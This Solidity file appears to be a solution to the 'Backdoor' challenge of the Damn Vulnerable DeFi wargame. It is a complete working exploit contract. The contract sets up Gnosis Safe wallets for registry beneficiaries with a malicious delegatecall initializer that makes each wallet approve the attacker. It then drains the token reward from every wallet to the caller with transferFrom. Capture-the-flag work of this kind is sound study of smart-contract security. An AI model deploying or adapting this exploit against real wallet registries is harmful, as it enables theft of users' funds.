// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../backdoor/WalletRegistry.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract BackdoorHack {
    address private immutable registryAddress;
    address private immutable masterCopyAddress;
    GnosisSafeProxyFactory private immutable walletFactory;
    DamnValuableToken private immutable dvt;

    constructor(
        address _registryAddress,
        address _masterCopyAddress,
        GnosisSafeProxyFactory _walletFactory,
        DamnValuableToken _token
    ) {
        registryAddress = _registryAddress;
        masterCopyAddress = _masterCopyAddress;
        walletFactory = _walletFactory;
        dvt = DamnValuableToken(_token);
    }

    function attack(address[] memory _beneficiaries) external {
        // create wallet for each beneficiary here(for loop each wallet)
        for (uint256 i = 0; i < _beneficiaries.length; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature(
                    "delegateApprove(address)",
                    address(this)
                ), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
                masterCopyAddress, // Singleton, the Gnosis master copy
                _initializer, // initializer => Payload for message call sent to new proxy contract.
                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(registryAddress) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
            );
            // // approve token transfer
            // _token.approve(address(wallet), 40 ether);
            // wallet will receieve DVT via callback then transfer to msg.sender
            dvt.transferFrom(address(wallet), msg.sender, 10 ether);
        }
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }
}
